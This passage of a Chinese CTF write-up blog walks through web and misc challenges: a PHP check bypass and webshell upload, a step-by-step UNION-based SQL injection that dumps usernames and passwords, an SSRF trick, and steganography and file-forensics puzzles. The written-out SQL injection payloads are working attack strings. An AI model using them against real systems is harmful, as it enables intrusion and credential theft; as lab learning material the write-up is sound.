data-src="https://img-blog.csdnimg.cn/20200731221412695.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>WP：咱们点击view-source查看下源码。<br><img data-src="https://img-blog.csdnimg.cn/20200731221513354.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img data-src="https://img-blog.csdnimg.cn/20200731221535708.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img data-src="https://img-blog.csdnimg.cn/20200731221549514.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里发现咱们需要绕过isset($_GET[id]) &amp;&amp; floatval($_GET[id]) !== ‘1’ &amp;&amp; substr($_GET[id], -1) === ‘9’，<br>这里限制了id值需要为浮点型但是不完全等于1，还要为字符串要等于9.这里设置1和9之间加入任意字符就行。即可绕过。<br>在burp中咱们上传一句话木马<br><img data-src="https://img-blog.csdnimg.cn/20200731224325519.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>在使用webshell工具连接<br><img data-src="https://img-blog.csdnimg.cn/20200731224455496.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到flag.<br>4.<img data-src="https://img-blog.csdnimg.cn/20200801105925269.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img data-src="https://img-blog.csdnimg.cn/20200801110021536.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img data-src="https://img-blog.csdnimg.cn/20200801110034466.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>WP:这里根据页面咱们先注册个账号。<br><img data-src="https://img-blog.csdnimg.cn/20200801110153755.png" alt="在这里插入图片描述"><br>这里注册成功后显示普通用户登录成功没什么用，说明咱们需要管理员登录。而登陆与注册页面没什么可利用的，发现还有个找回密码的页面先打开看看经过使用1’ or 1=1#测试发现该页面存在sql注入漏洞。<br><img data-src="https://img-blog.csdnimg.cn/20200801110919372.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>在使用union select测试那个字段可用。发现字段3可用<br><img data-src="https://img-blog.csdnimg.cn/20200801111935849.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>)<br>使用1’union select 1,2，database（），4#发现查询数据库失败。换一条语句试试1’ union select 1,2,group_concat(schema_name),4 from information_schema.schemata#发现<br><img data-src="https://img-blog.csdnimg.cn/20200801111814146.png" alt="在这里插入图片描述"><br>找到数据库后就是找表与列。<br>1’union select 1,2,(table_name),4 from information_schema.tables where table_schema=’cetc004’#<br><img data-src="https://img-blog.csdnimg.cn/20200801112328921.png" alt="在这里插入图片描述"><br>1’ union select 1,2,group_concat(column_name),4 from information_schema.columns where table_name = ‘user’#使用这个语句查询表单的列<br><img data-src="https://img-blog.csdnimg.cn/20200801112711933.png" alt="在这里插入图片描述"><br>这里只使用username与password两列。<br>1’union select 1,2,group_concat(username),4 from cetc004.user#<br>1’union select 1,2,group_concat(password),4 from cetc004.user#<br><img data-src="https://img-blog.csdnimg.cn/20200801113210591.png" alt="在这里插入图片描述"><br><img data-src="https://img-blog.csdnimg.cn/2020080111325379.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到了用户名和密码。<br>这里发现密码用MD5解密打不开，这里咱们重复注册一个管理员账号即可得到flag.<br>5.<img data-src="https://img-blog.csdnimg.cn/20200801114624474.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img data-src="https://img-blog.csdnimg.cn/20200801115242239.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>WP:试着输入上面给的域名发现没有任何回应。试着使用127.0.0.1发现<br><img data-src="https://img-blog.csdnimg.cn/20200801115419993.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现执行的是ping命令。利用模糊测试发现字符超过0x7F的ASCII都会引发Django的报错。咱们输入%80<br><img data-src="https://img-blog.csdnimg.cn/20200801115807863.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现报错信息。复制这段html后打开查看<br><img data-src="https://img-blog.csdnimg.cn/2020080112022260.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>在这里面找到了绝对网址<br><img data-src="https://img-blog.csdnimg.cn/2020080112031853.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>接下来在url中输入?url=@+绝对网址即可得到flag.<br>1.<img data-src="https://img-blog.csdnimg.cn/20200821200447879.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img data-src="https://img-blog.csdnimg.cn/20200821200619769.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>WP:打开文件后发现是张图片。我们用图片分析器打开。<br><img data-src="https://img-blog.csdnimg.cn/20200821201129251.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>这里也没有flag的线索。最后在下面这个按钮发现flag.<br><img data-src="https://img-blog.csdnimg.cn/20200821201255773.png#pic_center" alt="在这里插入图片描述"><br><img data-src="https://img-blog.csdnimg.cn/20200821201307481.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>2.<img data-src="https://img-blog.csdnimg.cn/20200821201742996.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>WP:用winhex打开解压后的文件发现<br><img data-src="https://img-blog.csdnimg.cn/20200821202612880.png#pic_center" alt="在这里插入图片描述"><br>50 4B 03 04可知文件类型为zip类型。修改文件后缀名后打开文件。<br><img data-src="https://img-blog.csdnimg.cn/20200821202810282.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>发现flag文件但是打开它需要密码。利用软件破解密码得到flag<br><img data-src="https://img-blog.csdnimg.cn/20200821203654121.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>flag{ev3n::y0u::bru7us?!}<br>3.<img data-src="https://img-blog.csdnimg.cn/2020082120411822.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>WP：打开文件发现是张倒立的flag.直接编辑垂直翻转<br><img data-src="https://img-blog.csdnimg.cn/20200821204310502.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>4.<img data-src="https://img-blog.csdnimg.cn/20200821204512536.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>WP:打开后发现是个游戏游戏的意思就是不要让猫走到边缘。结束后就有<br><img data-src="https://img-blog.csdnimg.cn/20200821204909167.png#pic_center" alt="在这里插入图片描述"><br>5.<img data-src="https://img-blog.csdnimg.cn/20200821205258616.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>WP：打开后发现<img data-src="https://img-blog.csdnimg.cn/20200821205453863.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>使用StegSolve打开往左翻页发现一个二维码扫描后发现<br><img data-src="https://img-blog.csdnimg.cn/20200821205647792.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img data-src="https://img-blog.csdnimg.cn/20200821205952169.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>得到一串16进制数字。开头为03F3知道他的后缀为.pyc将其转换为py文件<br><img data-src="https://img-blog.csdnimg.cn/20200821210541293.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>调用下函数得到AlphaLab.<br>6.<img data-src="https://img-blog.csdnimg.cn/20200821210853988.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>WP:文件解压后发现没有后缀直接放入winhex,发现<img data-src="https://img-blog.csdnimg.cn/20200821211721164.png#pic_center" alt="在这里插入图片描述"><br>修改后缀名得到一段音频，用audadicy工具打开选择频谱图即可得到flag<br><img data-src="https://img-blog.csdnimg.cn/2020082121215433.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>7.<img data-src="https://img-blog.csdnimg.cn/20200821212612174.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>WP:下载的时候发现文件后缀名为gz，使用binwalk(用于多重文件分离)查看下<br><img data-src="https://img-blog.csdnimg.cn/20200821214254379.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>发现文件类型为tar。解压后发现<img data-src="https://img-blog.csdnimg.cn/20200821214549487.png#pic_center" alt="在这里插入图片描述"><br>这两张图片使用stegslove合成下得到flag</p>
<p><img data-src="https://img-blog.csdnimg.cn/20200821214758286.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MDMxMjc1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>攻防</category>
      </categories>
  </entry>
</search>
